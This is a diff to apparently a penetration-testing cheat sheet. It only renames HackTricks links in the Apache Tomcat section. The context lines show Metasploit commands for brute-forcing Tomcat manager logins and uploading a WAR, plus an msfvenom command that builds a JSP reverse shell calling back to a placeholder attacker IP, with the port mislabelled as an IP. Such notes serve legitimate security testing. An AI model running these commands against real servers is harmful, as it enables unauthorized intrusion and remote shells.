@@ -147,7 +147,7 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.
 ```
 
 ### Apache Tomcat
-- [Default structure](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat/basic-tomcat-info)
+- [Tomcat Default Structure](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat/basic-tomcat-info#default-structure)
 ```bash
 # Brute forcing default credentials
 msf> use auxiliary/scanner/http/tomcat_mgr_login
@@ -159,7 +159,7 @@ msf> use exploit/multi/http/tomcat_mgr_upload
 # Upload the revshell.war file and access to it (/revshell/)
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
 ```
-> - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
+> - [HackTricks: Tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
 > - https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/
 
 
